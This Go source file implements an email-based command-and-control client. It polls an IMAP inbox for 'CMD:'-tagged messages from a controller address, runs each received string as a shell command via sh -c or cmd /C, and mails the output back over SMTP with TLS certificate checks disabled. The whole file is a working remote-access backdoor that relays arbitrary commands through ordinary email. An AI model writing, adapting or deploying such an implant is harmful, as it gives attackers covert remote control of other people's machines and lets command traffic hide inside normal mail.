package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/mail"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"github.com/google/uuid"
	"gopkg.in/gomail.v2"
)

type EmailConfig struct {
	ImapServer     string
	SmtpServer     string
	EmailAddress   string
	Password       string
	RecipientEmail string
}

type Client struct {
	config     EmailConfig
	imapClient *client.Client
	uuid       string
}

type Message struct {
	Type      string `json:"type"`      // "command" or "response"
	UUID      string `json:"uuid"`      // client UUID
	Content   string `json:"content"`   // actual command or response content
	Timestamp int64  `json:"timestamp"` // unix timestamp
}

func NewClient(config EmailConfig) *Client {
	return &Client{
		config: config,
		uuid:   uuid.New().String(),
	}
}

func (c *Client) Connect() error {
	if err := c.reconnect(); err != nil {
		return err
	}

	// Send initialization message
	if err := c.sendInit(); err != nil {
		return fmt.Errorf("failed to send init message: %v", err)
	}

	return nil
}

func (c *Client) reconnect() error {
	if c.imapClient != nil {
		c.imapClient.Logout()
	}

	// Create TLS config with certificate verification disabled
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Connect to IMAP server
	client, err := client.DialTLS(c.config.ImapServer, tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to connect to IMAP server: %v", err)
	}

	if err := client.Login(c.config.EmailAddress, c.config.Password); err != nil {
		return fmt.Errorf("failed to login to IMAP server: %v", err)
	}

	c.imapClient = client
	return nil
}

func (c *Client) ensureMailboxSelected() error {
	// First try to check connection with a NOOP
	if err := c.imapClient.Noop(); err != nil {
		log.Printf("NOOP failed, attempting reconnect: %v", err)
		if err := c.reconnect(); err != nil {
			return fmt.Errorf("failed to reconnect: %v", err)
		}
	}

	// Now try to select the mailbox
	if _, err := c.imapClient.Select("INBOX", false); err != nil {
		log.Printf("Failed to select inbox: %v", err)
		if err := c.reconnect(); err != nil {
			return fmt.Errorf("failed to reconnect: %v", err)
		}
		if _, err := c.imapClient.Select("INBOX", false); err != nil {
			return fmt.Errorf("failed to select inbox after reconnect: %v", err)
		}
	}
	return nil
}

func (c *Client) sendInit() error {
	m := gomail.NewMessage()
	m.SetHeader("From", c.config.EmailAddress)
	m.SetHeader("To", c.config.RecipientEmail)
	m.SetHeader("Subject", fmt.Sprintf("INIT:%s", c.uuid))
	m.SetBody("text/plain", "Initializing connection")

	d := gomail.NewDialer(c.config.SmtpServer, 587, c.config.EmailAddress, c.config.Password)
	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}

	if err := d.DialAndSend(m); err != nil {
		return fmt.Errorf("failed to send init message: %v", err)
	}

	return nil
}

func (c *Client) ExecuteCommand(command string) (string, error) {
	// Clean the command string
	command = strings.TrimSpace(command)
	
	log.Printf("Executing command: %s", command)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), fmt.Errorf("command execution failed: %v", err)
	}
	return string(output), nil
}

func (c *Client) SendResponse(response string) error {
	// Clean the response string
	response = strings.TrimSpace(response)
	
	// Create message structure
	msg := Message{
		Type:      "response",
		UUID:      c.uuid,
		Content:   response,
		Timestamp: time.Now().Unix(),
	}

	// Convert to JSON
	jsonData, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("failed to marshal response: %v", err)
	}

	log.Printf("Sending response message: %s", string(jsonData))

	m := gomail.NewMessage()
	m.SetHeader("From", c.config.EmailAddress)
	m.SetHeader("To", c.config.RecipientEmail)
	m.SetHeader("Subject", fmt.Sprintf("RESP:%s", c.uuid))
	m.SetHeader("Content-Type", "application/json")
	
	// Send raw JSON without any encoding
	m.SetBody("text/plain", string(jsonData))

	d := gomail.NewDialer(c.config.SmtpServer, 587, c.config.EmailAddress, c.config.Password)
	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}

	if err := d.DialAndSend(m); err != nil {
		return fmt.Errorf("failed to send response: %v", err)
	}

	log.Printf("Response sent successfully")
	return nil
}

func (c *Client) WaitForCommand() (string, error) {
	for {
		// Ensure we're connected and mailbox is selected
		if err := c.ensureMailboxSelected(); err != nil {
			log.Printf("Failed to select mailbox: %v, retrying...", err)
			time.Sleep(2 * time.Second)
			continue
		}

		criteria := imap.NewSearchCriteria()
		criteria.WithoutFlags = []string{"\\Seen"}
		criteria.Header = map[string][]string{"From": {c.config.RecipientEmail}}

		uids, err := c.imapClient.Search(criteria)
		if err != nil {
			log.Printf("Search error: %v, retrying...", err)
			time.Sleep(2 * time.Second)
			continue
		}

		if len(uids) > 0 {
			seqset := new(imap.SeqSet)
			seqset.AddNum(uids...)

			section := &imap.BodySectionName{Peek: true}
			items := []imap.FetchItem{imap.FetchEnvelope, section.FetchItem()}

			messages := make(chan *imap.Message, 10)
			done := make(chan error, 1)

			go func() {
				done <- c.imapClient.Fetch(seqset, items, messages)
			}()

			for msg := range messages {
				if strings.HasPrefix(msg.Envelope.Subject, "CMD:"+c.uuid) {
					r := msg.GetBody(section)
					if r == nil {
						continue
					}

					// Read the full message into memory
					var buf bytes.Buffer
					if _, err := io.Copy(&buf, r); err != nil {
						log.Printf("Failed to read message body: %v", err)
						continue
					}

					// Parse the email message
					email, err := mail.ReadMessage(&buf)
					if err != nil {
						log.Printf("Failed to parse email: %v", err)
						continue
					}

					// Read and clean the message body
					body, err := io.ReadAll(email.Body)
					if err != nil {
						log.Printf("Failed to read email body: %v", err)
						continue
					}

					// Log raw body for debugging
					log.Printf("Raw email body: %q", string(body))

					// First clean up the email encoding
					cleanBody := strings.ReplaceAll(string(body), "=\r\n", "")
					cleanBody = strings.ReplaceAll(cleanBody, "=3D", "=")
					cleanBody = strings.TrimSpace(cleanBody)

					log.Printf("Cleaned raw message: %q", cleanBody)

					// Parse JSON message
					var message Message
					if err := json.Unmarshal([]byte(cleanBody), &message); err != nil {
						log.Printf("Failed to parse JSON message: %v", err)
						continue
					}

					// Clean the command content but preserve special characters
					message.Content = strings.TrimSpace(message.Content)

					log.Printf("Received command message: %+v", message)

					// Verify message type and UUID
					if message.Type != "command" || message.UUID != c.uuid {
						log.Printf("Invalid message type or UUID: %+v", message)
						log.Printf("Expected UUID: %s, Got UUID: %s", c.uuid, message.UUID)
						continue
					}

					// Mark message as seen
					seqSet := new(imap.SeqSet)
					seqSet.AddNum(msg.SeqNum)
					item := imap.FormatFlagsOp(imap.AddFlags, true)
					flags := []interface{}{imap.SeenFlag}
					if err := c.imapClient.Store(seqSet, item, flags, nil); err != nil {
						log.Printf("Failed to mark message as seen: %v", err)
					}

					return message.Content, nil
				}
			}

			if err := <-done; err != nil {
				log.Printf("Fetch error: %v", err)
			}
		}

		time.Sleep(2 * time.Second)
	}
}

func main() {
	var config EmailConfig

	// Parse command line arguments
	flag.StringVar(&config.ImapServer, "imap", "", "IMAP server address (e.g., imap.gmail.com:993)")
	flag.StringVar(&config.SmtpServer, "smtp", "", "SMTP server address (e.g., smtp.gmail.com)")
	flag.StringVar(&config.EmailAddress, "email", "", "Email address")
	flag.StringVar(&config.RecipientEmail, "recipient", "", "Recipient's email address")
	flag.StringVar(&config.Password, "password", "", "Email password or app-specific password")
	flag.Parse()

	// Validate required flags
	if config.ImapServer == "" || config.SmtpServer == "" || 
	   config.EmailAddress == "" || config.Password == "" || 
	   config.RecipientEmail == "" {
		log.Fatal("All flags are required: -imap, -smtp, -email, -recipient, -password")
	}

	client := NewClient(config)
	if err := client.Connect(); err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer client.imapClient.Logout()

	log.Printf("Connected with UUID: %s", client.uuid)

	for {
		cmd, err := client.WaitForCommand()
		if err != nil {
			log.Fatalf("Error waiting for command: %v", err)
		}

		log.Printf("Executing command: %s", cmd)
		output, err := client.ExecuteCommand(cmd)
		if err != nil {
			log.Printf("Command execution error: %v", err)
			output = fmt.Sprintf("Error: %v\n%s", err, output)
		}

		if err := client.SendResponse(output); err != nil {
			log.Printf("Failed to send response: %v", err)
		}
	}
}
